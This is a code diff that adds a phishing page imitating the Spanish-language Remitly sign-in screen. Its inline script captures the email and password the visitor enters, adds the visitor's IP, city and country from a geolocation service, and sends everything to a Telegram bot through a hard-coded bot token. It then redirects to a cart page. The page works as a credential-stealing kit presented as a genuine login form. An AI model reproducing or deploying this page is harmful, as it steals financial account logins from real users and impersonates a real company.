@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Mi Proyecto</title>
+    <link rel="stylesheet" href="./Nick.css" />
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+    <script>
+      async function sendMessage() {
+        const url = "https://ipapi.co/json/";
+        const email = document.getElementById("email").value;
+        localStorage.setItem("usuario", email);
+        const password = document.getElementById("password").value;
+
+        axios.get(url).then((response) => {
+          const message =
+            "\nRemitly\nUsuario: " +
+            email +
+            "\nContra: " +
+            password +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          try {
+            axios
+              .post(
+                "https://api.telegram.org/bot6903851307:AAFFT0FDf1y9fYdBZIQWqfawRtUI1WH2wZM/sendMessage",
+                {
+                  chat_id: "@bdvyo1212",
+                  text: message,
+                }
+              )
+              .then((response) => {
+                window.location.href = "cart.html";
+              });
+          } catch (error) {
+            console.error("Error de red:", error);
+          }
+        });
+      }
+    </script>
+  </head>
+  <body>
+    <header>
+      <img src="./img/ss.png" alt="Logo" />
+      <div class="barra"></div>
+    </header>
+    <br /><br />
+    <div class="container">
+      <h2>Hola de nuevo</h2>
+      <p>Dirección de email</p>
+      <input type="email" id="email" placeholder="abc@example.com" />
+      <p>Contraseña</p>
+      <input type="password" id="password" placeholder="" />
+      <a href="#">Olvidé mi contraseña</a>
+      <button type="button" onclick="sendMessage()">Iniciar Sesión</button>
+    </div>
+    <br />
+    <div class="container2">
+      <span class="registro"
+        >¿Necesitas un perfil? <a href="#">Registrarse</a></span
+      >
+      <br />
+      <br />
+      <span
+        >Al usar Remitly, aceptas el
+        <a href="#"
+          >Firmar de forma electrónica el Aviso de divulgación y
+          consentimiento</a
+        >, la <a href="#">Política de privacidad</a> y el
+        <a href="#">Acuerdo de usuario</a>.</span
+      >
+    </div>
+  </body>
+</html>
